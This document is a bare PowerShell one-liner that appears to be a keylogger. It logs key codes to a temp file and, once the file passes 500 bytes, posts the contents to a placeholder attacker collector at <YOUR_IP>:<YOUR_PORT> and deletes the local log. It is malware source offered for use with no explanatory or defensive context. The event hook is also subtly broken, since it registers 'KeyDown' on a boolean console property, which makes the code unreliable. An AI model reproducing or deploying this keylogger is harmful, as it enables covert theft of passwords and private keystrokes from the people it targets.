$log="$env:temp\magickeys.txt";$uri="http://<YOUR_IP>:<YOUR_PORT>/collect";Register-ObjectEvent -InputObject ([Console]::TreatControlCAsInput) -EventName "KeyDown" -SourceIdentifier "magicK" -Action {$key=$event.SourceEventArgs;Add-Content -Path $log -Value $key.KeyCode;if((Get-Item $log).Length -gt 500){$data=Get-Content -Path $log -Raw;Invoke-RestMethod -Uri $uri -Method Post -Body $data;Remove-Item $log}};while($true){Start-Sleep -Seconds 10}
